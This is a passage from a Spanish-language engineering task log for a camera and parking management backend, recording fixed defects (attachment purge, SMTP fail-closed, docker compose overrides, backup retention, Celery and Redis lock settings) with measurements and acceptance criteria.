  miniaturas/64/64078f24a..._thumb.jpg
  ```
  Es decir: **la BD decía que las fotos ya no existían y los ficheros se quedaban en el disco para siempre** (y además inaccesibles: ni el backend ni el worker los veían ya). La retención de 90 días **no se cumplía**, sin que nadie se enterara: la tarea informaba de `deleted: 4` y todo parecía bien.
- **El arreglo** (cuatro cosas):
  1. el `celery-worker` y el `celery-beat` montan **el mismo volumen con nombre** que el backend, y definen `INCIDENT_ATTACHMENTS_DIR`;
  2. **fail-closed**: la purga comprueba si hay adjuntos **vivos** cuyo fichero no está en el disco. Si los hay, es que el proceso **no ve el volumen compartido**: lo dice en el log (`error`) y en el resultado (`files_absent_of_live`), en vez de decir «todo bien». Ahora el resultado distingue `files_deleted`, `files_missing` y `files_absent_of_live`;
  3. **las referencias se cuentan después de saber qué se purga**, no antes. Antes, dos adjuntos con el mismo hash (el mismo fichero, que es lo que pasa con dos fotos iguales) se veían como referencia mutua: **el fichero no se borraba nunca y las filas sí**. Medido en los datos reales: los adjuntos 3 y 4 de la QA compartían `originales/64/64078f24a...jpg`;
  4. la **barrida de huérfanos** (que ya existía como función y **no la llamaba nadie**) tiene ahora tarea de Celery (`solidapp.purge_orphan_attachments`) y horario (4:47 AM), con un margen de 1 hora: `crear_adjunto` escribe el fichero **antes** de crear la fila, así que hay una ventana en la que un fichero recién subido todavía no tiene fila.
- **Remedido** (2026-10-24, con el worker ya viendo el volumen compartido):
  ```
  RESULTADO DE LA PURGA: {'deleted': 4, 'retention_days': 90, 'cutoff': '...',
                          'files_deleted': 4, 'files_missing': 2,
                          'files_absent_of_live': 0}
  # en el volumen del backend, después:
  (sólo quedaba el huérfano anterior, que la barrida recogió después:
   {'deleted': 1, 'kept': 0, 'skipped_recent': 0, 'files_absent_of_live': 0})
  ```
  (`files_missing: 2` = los dos ficheros del adjunto 1, que **ya** faltaban antes de empezar: también se cuentan, en vez de ocultarse.)
- **Criterios de aceptación**:
  - [x] Medido: con el defecto, la purga dice `deleted: 4` y los ficheros siguen en el disco.
  - [x] El `backend`, el `celery-worker` y el `celery-beat` montan el mismo volumen y definen `INCIDENT_ATTACHMENTS_DIR`.
  - [x] La purga avisa (log `error` + `files_absent_of_live`) si no ve el volumen: **fail-closed**, no «falso verde».
  - [x] Dos adjuntos que comparten fichero: al caducar los dos, el fichero **se borra**.
  - [x] La barrida de huérfanos tiene tarea de Celery y horario, y no toca los ficheros recientes (margen de 1 h).
  - [x] Tests nuevos (3): el fichero compartido, el aviso del volumen y el margen de la barrida.
  - [x] Prueba inversa: los dos casos del T-141 en `tools/verificar_pruebas_inversas.py` (14/14 detectan su defecto).
  - [x] Puerta nueva `tools/verificar_volumen_adjuntos.py` (autoprueba con 4 casos de mentira), registrada en `tools/autopruebas.py`, `tools/verificar_repo.py` y en el workflow del CI.

### T-142 · P1 (producción) — en una sucursal los correos NO salían nunca (y nadie se enteraba)

- **Estado**: **completado** — el worker arranca en producción, el SMTP es obligatorio y el correo no puede fingir que ha salido
- **Contexto**: los correos del producto (restablecer contraseña, alertas de cámara caída) los envía el **worker**, en una tarea de Celery. Y `email._is_dry_run()` dice: *si el entorno no es `production`, el correo se simula* (se loguea y se devuelve `True` **sin enviar nada**).
- **El defecto**: el `docker-compose.prod.yml` (el override que se copia a una sucursal, ADR-0001) le daba `ENVIRONMENT: production` **sólo al `backend`**. El `celery-worker` y el `celery-beat` se quedaban en `development`… pero como `environment` es un **mapa**, y el compose de producción no lo redefinía, los tres servicios **heredaban** el `development` del compose de desarrollo.
- **Medido** (2026-10-24, sobre el compose combinado — el que se despliega de verdad):
  ```
  backend        ENVIRONMENT='production'  SMTP_HOST=None
  celery-worker  ENVIRONMENT=None          SMTP_HOST=None   <-- se queda en 'development'
  celery-beat    ENVIRONMENT=None          SMTP_HOST=None   <-- idem
  ```
  Y en `development` el correo es un **dry-run que devuelve `True`**. Es decir, en cualquier sucursal:
  - el **restablecer contraseña** respondía 200 «si la cuenta existe, te hemos enviado un correo» y el correo **no salía nunca** (y el token **no se borraba**, porque el dry-run devuelve éxito: el enlace, si alguna vez llegara, seguiría vivo hasta caducar);
  - las **alertas de cámara caída** no llegaban al gestor;
  - y **ningún log** decía nada: era un `info` de dry-run, y el sistema parecía funcionar.
- **El arreglo** (tres cosas):
  1. el compose de producción da `ENVIRONMENT: production` al worker y al beat, y **`SMTP_HOST` es obligatorio en los tres** (`${SMTP_HOST:?...}`, sin valor por defecto): si falta, `docker compose` **falla al arrancar** (fallo temprano y explícito) en vez de desplegar con los correos mudos. El worker (y el beat) necesitan también `FRONTEND_BASE_URL`: el enlace del correo de reset lo construye el worker, y en producción `Settings` **exige** esa variable (si no, no arrancaría);
  2. **fail-closed en el código**: en producción, un `SMTP_HOST` vacío o `localhost` significa que nadie ha configurado el correo ⇒ el envío **falla** con un `log.error` explícito («no hay SMTP configurado… el correo NO se ha enviado») en vez de fingir. Además, fuera de `development` el dry-run avisa con `warning` (que alguien tiene que mirar), no con `info`;
  3. la **puerta del compose de producción** comprueba ahora al worker y al beat (no sólo al backend), **fusionando** los dos compose (el override pisa lo heredado: sin la fusión, un servicio que el override no menciona parecería no tener `ENVIRONMENT` cuando en realidad hereda el `development`).
- **Medido** (2026-10-24, dentro del contenedor, con `ENVIRONMENT=production` y `SMTP_HOST=localhost`):
  ```
  smtp_configurado(): False
  ERROR app.services.password_reset_email send_password_reset_email:
        no hay SMTP configurado (SMTP_HOST='localhost'): el correo NO se ha enviado
  RESULTADO (False = no finge que salio): False
  ```
- **Criterios de aceptación**:
  - [x] Medido: el compose combinado deja al worker y al beat sin `ENVIRONMENT` (y sin `SMTP_HOST`).
  - [x] El worker y el beat arrancan en `production` en el compose de producción.
  - [x] `SMTP_HOST` es **obligatorio** en los tres servicios: sin él, el despliegue falla al arrancar.
  - [x] El worker y el beat tienen `FRONTEND_BASE_URL` (en producción `Settings` la exige).
  - [x] Fail-closed: sin SMTP configurado en producción, el envío **falla con `log.error`** en vez de fingir (medido dentro del contenedor).
  - [x] Fuera de `development`, el dry-run avisa con `warning` y no con `info`.
  - [x] Tests nuevos (4) y **2 casos** más en la puerta de pruebas inversas.
  - [x] La puerta del compose de producción comprueba al worker y al beat (5 casos de mentira nuevos).


### T-143 · P2 (logs) — el 413 volvía a llevar el nombre del fichero en crudo

- **Estado**: **completado** — el nombre va saneado, como en el resto de mensajes
- **Contexto**: el T-136 ya saneó el nombre del fichero en los mensajes de `validar_imagen` y de `crear_adjunto`, pero el **413** del router (`incidents.py`, «el fichero supera el tamaño máximo») seguía usando `upload.filename` en crudo.
- **Por qué es un defecto**: un nombre con un salto de línea se cuela en el **log** (log forging) y en el mensaje que ve el cliente. Es el mismo patrón que corrigió el T-136.
- **Criterios de aceptación**:
  - [x] El 413 lleva el nombre **saneado** (`nombre_seguro`).
  - [x] Test (`test_el_nombre_del_fichero_no_rompe_el_mensaje_de_413`) y **prueba inversa** en `tools/verificar_pruebas_inversas.py`.

### T-144 · P2 (funcional) — las fotos caducadas ocupaban cupo y bloqueaban las nuevas

- **Estado**: **completado** — un adjunto caducado no cuenta para el límite
- **Contexto**: el límite es de 3 fotos por incidente, y se comprobaba con `contar_adjuntos`, que contaba **todas** las filas del incidente, incluidas las **caducadas**.
- **Por qué es un defecto**: una foto caducada no se puede descargar (410) ni sale en el listado: es invisible, pero ocupaba cupo. Un incidente con tres fotos caducadas no admitía **ninguna** nueva, y el operador no podía documentar nada en él.
- **El arreglo**: `contar_adjuntos` cuenta sólo las fotos **vigentes**. La caducidad se comprueba **en Python** (no en SQL), porque un `DateTime(timezone=True)` vuelve *naive* en SQLite y compararlo con un datetime con zona revienta: es el mismo ajuste que hace `_exigir_no_caducado`.
- **Criterios de aceptación**:
  - [x] Las tres fotos caducadas de un incidente **no** bloquean una subida nueva (test `test_un_adjunto_caducado_no_ocupa_cupo`).
  - [x] Prueba inversa en `tools/verificar_pruebas_inversas.py`.

### T-145 · P1 (despliegue) — en una sucursal corría el código del disco, no el de la imagen

- **Estado**: **completado** — lo que corre es el artefacto que se construyó y se verificó
- **Contexto**: `docker-compose.prod.yml` es un **override** del compose de desarrollo. Sólo redefinía `ports` y `environment` del backend, así que **heredaba** del compose de desarrollo dos cosas de desarrollo: el `command` con `--reload` (un watcher de uvicorn que recarga en caliente) y el **bind mount** `./backend:/app`.
- **Por qué es un defecto**: con el bind mount, el código que se ejecuta es el del **disco de la máquina**, no el de la imagen que se construyó y se verificó. El artefacto desplegado deja de ser el que se probó, y `--reload` recarga el proceso cuando alguien toca un fichero.
- **Medido** (2026-10-24, sobre el compose combinado, que es el que se copia a una sucursal):
  ```
  backend        command: uvicorn app.main:app --host 0.0.0.0 --port 8000
                 reload: no
                 monta el codigo del host en /app: no
  celery-worker  reload: no | monta el codigo del host en /app: no
  celery-beat    reload: no | monta el codigo del host en /app: no
  ```
- **El arreglo** (y un efecto secundario que hubo que resolver): sin el bind mount, `/app` es el de la imagen, que es de `root` y el proceso corre como `app` ⇒ el beat no puede escribir ahí su `celerybeat-schedule`. Por eso el schedule pasa a `/var/lib/solidapp/` (del usuario `app`) y su healthcheck mira ahí. **Medido**: el beat recreado con el schedule nuevo queda `healthy`.
- **Criterios de aceptación**:
  - [x] El compose de producción no deja `--reload` en ningún servicio.
  - [x] El compose de producción **no** monta `./backend:/app` (ni el worker ni el beat).
  - [x] El beat arranca y queda `healthy` con el schedule en su sitio nuevo (medido).
  - [x] La puerta del compose de producción lo comprueba (2 casos de mentira nuevos).

### T-146 · P1 (backups) — la retención GFS sólo conservaba 7 backups: el mensual no existía

- **Estado**: **completado** — la retención conserva de verdad 7 diarios + 4 semanales + 6 mensuales
- **Contexto**: `infra/backup/backup.sh` promete (en su cabecera, en su README y en el plan) conservar **7 diarios + 4 semanales + 6 mensuales**. Se calculaba con `awk -F'-' '!seen[$2]++'`.
- **El defecto**: el nombre del fichero es `solidapp-AAAAMMDDTHHMMSSZ.dump.enc` y el STAMP **no** tiene guiones ⇒ `$2` era el **stamp entero** (único por fichero) y `$3` era `dump.enc`. O sea: «un fichero por semana» era en realidad «un fichero por fichero», y «un fichero por mes» también. Los tres listados acababan en los mismos ficheros más recientes.
- **Medido** (2026-10-24, 400 backups de mentira, ejecutando la función antigua en un contenedor):
  ```
  backups | codigo | sobreviven | semanas | meses
       10 |      0 |          7 |       1 | 1
      400 |      0 |          7 |       1 | 1
  ```
  Es decir: **sólo 7 backups**, de **una** semana y de **un** mes. El backup mensual que el plan promete conservar se borraba a los siete días, y el semanal también. Y el script no falla: sólo borra de más, sin que nadie se entere.
- **El arreglo**: se calculan de verdad el **día**, la **semana ISO** (`%G-%V`) y el **mes** (`%Y-%m`). De paso, el `head -n` se cambia por `sed -n '1,Np'`: con `set -o pipefail`, un `head` que cierra la tubería antes de tiempo deja al `printf`/`find` con SIGPIPE y el script aborta con el código 141.
- **Remedido** (2026-10-24, con el script arreglado): **14 backups** sobreviven, con **4 semanas** y **6 meses** distintos.
- **Criterios de aceptación**:
  - [x] La retención agrupa por día, semana ISO y mes de verdad.
  - [x] Remedido: sobreviven los 7 diarios + 4 semanales + 6 mensuales (14 ficheros con solapamientos).
  - [x] Puerta nueva `tools/verificar_retention_backup.py` (crea 400 backups de mentira, ejecuta el script **de verdad** en un contenedor y comprueba la política), con autoprueba de 3 casos.
  - [x] La puerta queda registrada en `tools/verificar_repo.py` (necesita Docker, así que no va en el job `backend` del CI, como ya pasa con `verificar_backup.py`).


### Pendientes medidos (2026-10-24) — los que la auditoría encontró y quedan abiertos

Salieron de una auditoría con subagentes (Celery, backups, informes y
adjuntos). Cada uno tiene su **medición** y su comando; están aquí para
que no se pierdan, en orden de gravedad. **Ninguno está arreglado**: son
cambios de más calado que los de esta tanda, y varios son decisiones de
producto.

- **[MEDIA] Dos de las tres purgas traen todos los registros a memoria**
  (`vehicle_purge.py` y `purgar_adjuntos_vencidos`, esta última con N+1),
  sin lotes, frente a `purge_audit_logs`, que sí va por lotes (T-104).
- **[MEDIA] El worker no recarga el código** (bind mount sin `--reload`) y
  la puerta de tareas lee el **fuente**, no el worker en marcha: una tarea
  nueva puede «pasar la puerta» y no existir en el worker real.
- **[MEDIA] El backup no incluye los adjuntos** salvo que se configure
  `ATTACHMENTS_DIR` (el script lo avisa, pero el compose no lo pone).


### T-147 · P1 (CI) — lo que el CI remoto enseñó al arrancar por primera vez

- **Estado**: **completado** — el CI remoto vuelve a ejecutar pasos, y las dos puertas que fallaban están arregladas
- **Contexto**: al hacer el repositorio **público** (decisión del usuario, 2026-10-24), el CI remoto **arrancó por primera vez en más de tres meses**: los 4 jobs pasaron de «0 pasos» a ejecutar sus pasos. `Integration` y `Frontend` salieron en **SUCCESS**; `Backend` y `Build de imágenes Docker` fallaron.
- **Lo que enseñó** (los dos fallos eran de las puertas de ese mismo día, y los dos por la misma causa):
  1. el job `Backend` corre las autopruebas **antes** del `pip install` (a propósito, para fallar en segundos) ⇒ la autoprueba de la puerta del compose falló con `No module named 'pydantic'`;
  2. el job `Build de imágenes Docker` no instala el backend ⇒ la puerta del compose falló **por el mismo motivo**.
  Es decir: la puerta fallaba **por el entorno**, no por lo que vigila. Era un fallo **latente desde el T-75** que sólo se ha podido ver cuando el CI ha arrancado de verdad.
- **El arreglo** (dos cosas, porque el CI enseñó dos fallos distintos):
  1. la puerta del compose **no falla** si no puede importar la configuración del backend: lo dice en un **aviso** (un verde silencioso sobre una comprobación que no se ha hecho no vale);
  2. el **orden** del job `backend` cambia: el `pip install` del backend pasa a **antes** de las comprobaciones. Antes estaba al final, a propósito («que fallen en dos segundos en vez de esperar al install»), pero la puerta de pruebas inversas **ejecuta pytest** y la del compose **importa `Settings`**: sin las dependencias, ambas fallaban por el entorno y no por lo que vigilan. El escáner de texto (que es sólo biblioteca estándar) sigue siendo lo primero, así que se conserva la ventaja de fallar rápido.
- **Medido** (2026-10-24, en un venv **vacío**, que es lo que ve el job de Docker): la puerta y su autoprueba pasan sin las dependencias, y la puerta **avisa** de que la comprobación de `Settings` no se ha hecho ahí.
- **Criterios de aceptación**:
  - [x] La puerta del compose no depende de `pydantic` para vigilar el compose (medido en un venv vacío).
  - [x] Si no puede comprobar la carga en `Settings`, **lo dice** en un aviso.
  - [x] El workflow comprueba esa parte **después** de instalar las dependencias, donde sí se puede.
  - [x] `actionlint` en verde con el paso nuevo.


### T-148 · P2 (entorno) — las QAS de navegador apuntaban a `localhost` y el IPv6 las tumbaba

- **Estado**: **completado** — las QAS apuntan a `127.0.0.1`
- **Contexto**: las QAs de navegador (login, sesión caducada, gestor sin sucursales, visual) usaban `http://localhost:5173`.
- **El defecto**: en Windows, `localhost` resuelve **primero a IPv6** (`::1`), y el dev-server de Vite (en el contenedor, con `--host 0.0.0.0`) **no escucha en IPv6**.
- **Medido** (2026-10-24):
  ```
  por IPv4 (127.0.0.1):  HTTP 200 en 0 ms
  por IPv6 ([::1]):      timeout
  ```
  El síntoma era un `Page.goto` que agotaba los 30 s al navegar a `/login`, con el backend y el frontend perfectamente sanos: cuatro comprobaciones del `verificar_repo.py` en rojo («un login que no puede cargar el perfil», «un gestor sin sucursales», «la sesión caducada…») sin que hubiera ningún defecto en la aplicación.
- **El arreglo**: las cinco QAS usan `http://127.0.0.1:5173`. El AGENTS.md ya avisaba de la trampa (por `psycopg`); ahora está en el sitio donde se manifiesta (las QAs).
- **Criterios de aceptación**:
  - [x] Medido: por `127.0.0.1` responde en 0 ms; por `::1`, timeout.
  - [x] Las cinco QAS usan `127.0.0.1`.
  - [x] Las tres QAs que estaban en rojo vuelven a pasar.


### T-149 · P1 (resiliencia) — el correo de una alerta se perdía en silencio si el broker estaba caído

- **Estado**: **completado** — ahora se intenta en línea y queda registrado
- **Contexto**: `encolar_correo_alerta` devuelve `False` si no puede encolar (el broker —Redis— está caído) y su docstring promete «el llamante envía el correo **en línea** (más lento, pero llega)». Pero **los tres llamantes** (`alerts.py` en OCR_FAILED y en CAMERA_OFFLINE, e `incidents.py` en el robo) **descartaban el valor de retorno**.
- **El defecto**: con el broker caído en el instante en que una cámara caía, la alerta quedaba **commiteada** (visible por REST, así que el operador creía que estaba enterado), el correo **no se enviaba** y no quedaba rastro más allá de un `log.exception` genérico.
- **El arreglo**: que lo haga **la propia función** (una sola implementación, en vez de tres): si no se puede encolar, relee la alerta y manda el correo **en línea**. Es más lento (el SMTP está en el hilo del llamante), pero llega — y sólo en ese caso, que es raro y grave.
- **Medido** (2026-10-24, contra el stack de QA, **con Redis parado de verdad**):
  ```
  == encolar el correo con el broker CAIDO ==
  encolar_correo_alerta: no se pudo encolar el correo
  encolar_correo_alerta: el broker esta caido; se envia el correo de la alerta 315 EN LINEA
  devuelto: False
  ```
  (El `False` es del SMTP de mentira: lo importante es que **se intenta** y que **queda dicho en el log**, en vez de perderse.)
- **Criterios de aceptación**:
  - [x] Con el broker caído, el correo se envía en línea (medido con Redis parado).
  - [x] El intento queda registrado en el log (`warning`), no se pierde en silencio.
  - [x] Test (`test_el_correo_sale_en_linea_si_el_broker_esta_caido`) y **prueba inversa** en `tools/verificar_pruebas_inversas.py`.


### T-150 · P1 (resiliencia) — el lock de la ronda de heartbeats caducaba con la ronda viva

- **Estado**: **completado** — el TTL del lock se renueva mientras la ronda sigue viva
- **Contexto**: el T-102 puso un lock (`SET NX EX 120`) para que dos rondas de heartbeat no se solapen. Pero el TTL era **fijo** y la ronda **no tiene duración acotada**.
- **El defecto**: si la ronda vivía más de 120 s (muchas cámaras, el pool de asyncio es de 32 y el sondeo va en paralelo pero no es instantáneo), **el lock caducaba con la ronda todavía en marcha**. Entonces la ronda que publica el beat (cada 60 s) lo tomaba y **dos rondas corried a la vez**: los fallos de cada cámara se contaban dos veces por minuto, se duplicaban las filas de auditoría y los eventos, y dos rondas podían tomar a la vez el lock de alerta de una cámara. Es decir: **volvían los daños del T-102**, que ya se habían creído arreglados.
- **El arreglo**: **renovar** el TTL del lock mientras la ronda vive (un hilo que lo renueva cada TTL/3), y no ampliar el TTL a ciegas: si el worker muere, el lock caduca en cuanto antes y no bloquea la ronda siguiente más de lo previsto. La renovación es **atómica** (Lua: si el lock ya no es el nuestro, no se toca).
- **Medido** (2026-10-24, en el contenedor, contra el Redis del stack):
  ```
  token tomado: True
  TTL inicial: 5 s
  TTL sin renovar (pasados 2,5 s): 2 s
  renovado: True
  TTL tras renovar: 5 s            <-- renovado
  renovado con token ajeno: False  <-- no toca el lock de otra ronda
  ```
- **Criterios de aceptación**:
  - [x] El TTL del lock se renueva (medido: 5 s → 2 s → 5 s).
  - [x] Un lock ajeno **no** se renueva (la comparación es atómica).
  - [x] Tests (3) contra el Redis real y **prueba inversa** en `tools/verificar_pruebas_inversas.py`.


### T-151 · P1 (resiliencia) — el worker no reentregaba las tareas ni acotaba su duración

- **Estado**: **completado** — el broker reentrega lo que se pierde, y ninguna tarea puede ocupar un slot para siempre
- **Contexto**: la configuración del Celery tenía `task_acks_late=True` (el mensaje se confirma **después** de ejecutarse), pero le faltaban dos cosas.
- **El defecto**:
  1. **sin `task_reject_on_worker_lost`**: si el worker muere de forma abrupta (OOM, el contenedor lo mata), el mensaje **no se reentrega** hasta que vence el `visibility_timeout` de Redis (**1 hora**). Y el beat publica la ronda de heartbeats **cada 60 s**: la cola crece sin que nadie la consuma, y el trabajo se hace una hora tarde (o nunca);
  2. **sin límites de tiempo**: una tarea colgada (una cámara que no responde, un `asyncio.wait_for` que no puede matar un hilo) ocupa un **slot del pool para siempre**;
  3. con `acks_late`, una tarea que **falla** se reentrega, y sin límite de intentos eso es un **bucle**: un error permanente se reintenta para siempre.
- **El arreglo**:
  - `task_reject_on_worker_lost=True` ⇒ el broker reentrega **enseguida** si el worker muere;
  - `task_soft_time_limit=1800` / `task_time_limit=1860` ⇒ ninguna tarea puede quedarse con un slot para siempre (el blando lanza `SoftTimeLimitExceeded` dentro de la tarea, el duro mata el proceso);
  - `task_acks_on_failure_or_timeout=True` ⇒ una tarea que falla se confirma y **no** se reintenta en bucle; las que deben reintentarse lo hacen con `autoretry_for` explícito.
  - OJO: `task_reject_on_worker_lost` **sólo** funciona con el pool **prefork** (que es el que usa el compose: `celery ... worker`), no con threads ni gevent.
- **Medido** (2026-10-24, con el worker reiniciado, preguntándole su configuración efectiva):
  ```
  task_acks_late: True
  task_reject_on_worker_lost: True
  task_soft_time_limit: 1800
  task_time_limit: 1860
  task_acks_on_failure_or_timeout: True
  ```
- **Criterios de aceptación**:
  - [x] El worker reentrega las tareas si muere (`task_reject_on_worker_lost`).
  - [x] Ninguna tarea puede ocupar el slot para siempre (límites blando y duro).
  - [x] Una tarea que falla no se reintenta en bucle.
  - [x] Tests (3) y **prueba inversa** en `tools/verificar_pruebas_inversas.py`.


### T-152 · P2 (funcional) — `GET /cameras/{id}/health` daba un 500 con la fecha *naive*

- **Estado**: **completado** — el endpoint normaliza la zona horaria
- **Contexto**: `cameras.py` **no** normalizaba el `tzinfo` de `last_heartbeat_at` antes de restarlo de `datetime.now(timezone.utc)`. Es el patrón que el AGENTS.md repite y que el resto de ficheros del repo respetan.
- **El defecto**: un `DateTime(timezone=True)` vuelve **naive** al releerlo de **SQLite**; restar un naive de un aware da `TypeError` ⇒ **500** en el endpoint de la salud de una cámara. En PostgreSQL no se reproduciría (ahí vuelve con zona), o sea: **depende del motor de base de datos**.
- **Por qué ningún test lo detectaba**: los tests que había asignan la fecha **en memoria**, y en memoria sigue siendo *aware* (la sesión de pruebas no relee el valor). El defecto sólo aparece cuando el valor **viene de la BD**.
- **El arreglo**: normalizar la fecha antes de restarla (el mismo ajuste que hacen `app/api/v1/incidents.py` y el resto de servicios).
- **Criterios de aceptación**:
  - [x] El endpoint no da un 500 con una fecha naive (test que **relee de la BD**).
  - [x] El test convierte el `TypeError` en un `AssertionError`, para que el fallo sea una **aserción** y no un error de código (lo que exige la puerta de pruebas inversas).
  - [x] Prueba inversa en `tools/verificar_pruebas_inversas.py`.


### T-153 · P2 (informes) — el informe de alertas no heredaba el tope de filas

- **Estado**: **completado** — hereda el tope (T-100) como los otros informes
- **Contexto**: el T-100 puso un tope de **20.000 filas** por informe, porque un PDF dibuja cada fila y, si el proceso se queda sin memoria, **se cae la API entera** (no sólo el informe).
- **El defecto**: `build_alertas_report` era el **único** de los cinco informes que **no** heredaba el tope: `.all()` traía **todas** las alertas de la ventana a memoria. Los otros cuatro sí lo hacen (`ingresos`, `ocupacion`, `tickets` con `.limit(MAX_FILAS_INFORME + 1)` + `_acotar_filas(...)`; `margins` delega en `compute_margin`).
- **Por qué importa**: la tabla de alertas es la que **crece sola** (el T-104 redujo su crecimiento, pero no lo impidió: sin ese cambio eran 5.928 filas de cada 8.763). Un informe de un periodo con muchas alertas cargaba cientos de miles de filas en memoria y, con el PDF, las dibujaba todas.
- **El arreglo**: heredar el tope ⇒ si la ventana lo supera, se lanza `InformeDemasiadoGrandeError` (no se recorta en silencio: un informe truncado sin avisar es peor que un error).
- **Criterios de aceptación**:
  - [x] El informe de alertas rechaza una ventana que supera el tope (test).
  - [x] Si la ventana cabe, el informe sale con sus filas (test).
  - [x] Prueba inversa en `tools/verificar_pruebas_inversas.py`.

### Refutado por medición (2026-10-24) — «`/margins` no normaliza la ventana a UTC»

- **Estado**: **refutado** — el hallazgo **no era un defecto**; no se ha tocado nada.
- **La sospecha** (de la auditoría): `/margins` normalizaba la ventana para *comparar* pero no para *devolver*, así que los mismos datos darían números distintos en SQLite y en PostgreSQL.
- **Medido** (2026-10-24, contra el stack de QA, con la **misma** ventana en las dos formas):
  ```
  from             con zona='2026-06-01T00:00:00Z'  sin zona='2026-06-01T00:00:00Z'
  to               con zona='2026-07-01T00:00:00Z'  sin zona='2026-07-01T00:00:00Z'
  total_revenue    con zona=1.96  sin zona=1.96
  total_costs      con zona=0.0  sin zona=0.0
  margin           con zona=1.96  sin zona=1.96
  closed_tickets   con zona=2  sin zona=2
  ```
  Los **números son idénticos** y el JSON sale **normalizado a UTC** (con la `Z`): `compute_margin` normaliza la ventana antes de usarla, y el `MarginReportRead` se valida con esos valores ya normalizados.
- **Por qué se documenta igual**: para que nadie lo «arregle» después. El comentario de `_parse_window` («los valores devueltos NO se normalizan aquí para no alterar el JSON de /margins») puede leerse como un defecto, pero la normalización **sí** ocurre, en `compute_margin`.


### T-154 · P1 (copia de seguridad) — el backup no se llevaba las fotos de los incidentes

- **Estado**: **completado** — el backup incluye las fotos, cifradas, y se pueden recuperar
- **Contexto**: las fotos de los incidentes **no** están en la base de datos (viven en un volumen). El script `backup.sh` tiene el bloque de adjuntos (T-78), pero **si `ATTACHMENTS_DIR` está vacío o no existe, avisa y sigue** (`return 0`): el backup «sale bien» **sin las fotos**.
- **El defecto**: en el despliegue real no se le daba:
  1. el `cron` documentado en `infra/backup/README.md` **no** lleva `ATTACHMENTS_DIR`;
  2. y la ruta que el README exportaba (`/var/lib/solidapp/incident-attachments`) es la **dentro del contenedor**: desde el host (donde corre el cron) **no existe**, así que el script avisaría «ATTACHMENTS_DIR no existe» y seguiría sin las fotos.

  Es decir: **en una sucursal, el backup se hacía sin las fotos**. Al restaurar en otra máquina, la base de datos dice que las fotos están y los ficheros no (las descargas dan 404). Y son **datos personales** (LOPDGDD): la copia de seguridad no cubría una parte de los datos.
- **El arreglo**: un servicio `backup` en el compose (con `profiles: ["backup"]`, para que no arranque en un `up -d` normal) que monta **el mismo volumen de adjuntos** que el backend y define `ATTACHMENTS_DIR`; y el `cron` documentado pasa a ejecutarlo con `docker compose run --rm backup`.
- **Medido** (2026-10-24, contra el stack de QA: una foto de prueba en el volumen, el backup, y descifrado del resultado):
  ```
  solidapp-20261024T102635Z.adjuntos.tar.enc
  solidapp-20261024T102635Z.dump.enc

  # el dump descifrado:
  0000000   P   G   D   M   P          <-- la firma del dump

  # el tar de adjuntos descifrado:
  ./
  ./miniaturas/
  ./originales/
  ./originales/prueba/                 <-- la foto de prueba ESTA dentro
  ```
- **Criterios de aceptación**:
  - [x] El servicio `backup` monta **el mismo** volumen de adjuntos que el backend y define `ATTACHMENTS_DIR`.
  - [x] El `cron` documentado ejecuta el servicio (no el script suelto).
  - [x] Medido: el backup produce el tar de adjuntos cifrado y, al descifrarlo, contiene las fotos.
  - [x] Puerta nueva `tools/verificar_backup_adjuntos.py` (5 casos de mentira), registrada en `tools/autopruebas.py` y en `tools/verificar_repo.py`.


### T-155 · P2 (puerta) — la puerta del compose exigía `restart` a los servicios one-shot

- **Estado**: **completado** — los one-shot quedan exentos, y está documentado por qué
- **Contexto**: la regla del T-101 («todos los servicios se levantan solos si mueren») se aplicaba a **todos** los servicios, incluidos los **one-shot** (los que declaran `profiles` y se ejecutan a propósito, como el nuevo servicio `backup`).
- **El defecto**: para un one-shot, `restart: unless-stopped` es **contraproducente**: el script termina al hacer su trabajo, Docker lo ve caído y lo vuelve a arrancar, **en bucle**. Es decir: la puerta obligaba a poner una política **peor** que la que corresponde, y su única forma de «cumplir» era mentir sobre el comportamiento del servicio.
- **Cómo salió**: al añadir el servicio `backup` (T-154), el `verificar_repo.py` puso la puerta del compose en rojo («el servicio backup no tiene 'restart: unless-stopped'»). El defecto estaba en la **puerta**, no en el compose.
- **El arreglo**: los servicios con `profiles` quedan exentos de la regla del reinicio automático, y la puerta lo documenta (con un caso de autoprueba propio).
- **Criterios de aceptación**:
  - [x] La puerta del compose pasa con el servicio `backup` (que es one-shot).
  - [x] La puerta sigue exigiendo `restart: unless-stopped` a los servicios **normales**.
  - [x] Caso de autoprueba: un one-shot con `restart: "no"` no es un fallo.


### T-156 · P2 (rendimiento) — la purga de vehículos fantasma cargaba la tabla entera en memoria

- **Estado**: **completado** — va por lotes, como la purga de auditoría (T-104)
- **Contexto**: la tabla `vehicles` **crece sin límite** en un sistema de OCR que ve matrículas nuevas constantemente (es el motivo del T-125). Y la purga corre a diario.
- **El defecto**: `vehiculos_fantasma` hacía `.all()`: la purga traía **todos** los vehículos fantasma a memoria de una vez, y después filtraba por antigüedad **en Python** (porque un `datetime` de la BD vuelve *naive* en SQLite y la comparación en SQL daría un resultado falso).
- **Matiz (la auditoría se equivocó en una parte)**: no era un N+1. El filtro de «sin tickets» es un `EXISTS` **correlacionado** (una sola consulta), no una consulta por vehículo. El defecto real era el ** `.all()` sin acotar**, no el número de consultas.
- **El arreglo**: lotes de 500, **los más antiguos primero** (como `purge_audit_logs`, T-104): se cogen `LOTE` candidatos, se purgan los que cumplen el corte y se repite; si del lote no sale ninguno que lo cumpla, se para (los siguientes son más recientes).
- **Criterios de aceptación**:
  - [x] La consulta de la purga va acotada (`LIMIT`): un test lo comprueba mirando el SQL que se ejecuta.
  - [x] Con un lote de 2, la purga borra **todos** los vehículos fantasma (el bucle funciona).
  - [x] Prueba inversa en `tools/verificar_pruebas_inversas.py`.


### T-157 · P2 (puerta) — la puerta de tareas miraba el fuente, no el worker en marcha

- **Estado**: **completado** — la puerta consulta al worker en marcha y avisa del desfase
- **Contexto**: `tools/verificar_tareas_celery.py` comprueba (todo con el AST del código) que toda tarea de Celery se ejecuta de alguna forma. Pero el worker tiene el código **montado** (`./backend:/app`) y **no lo recarga**: `--reload` no lo soporta el pool *prefork* de Celery.
- **El defecto**: el worker podía estar corriendo **el código viejo**, y la puerta no se enteraba (miraba el fuente). O sea: una tarea nueva podía «pasar la puerta» y **no existir en el worker real**: el beat la publica y el worker responde «Received unregistered task». Es el mismo patrón que la puerta del compose que importaba `Settings` sin tener `pydantic`: **la puerta miraba donde no era**.
- **Medido** (2026-10-24, en vivo: se añadió una tarea al fuente **sin** reiniciar el worker):
  ```
  FALLO: el worker en marcha NO tiene estas tareas:
    - solidapp.tarea_de_prueba_t157
    El worker corre el codigo viejo: los workers no recargan el codigo
    (--reload no lo soporta el pool prefork). Reinicialo:
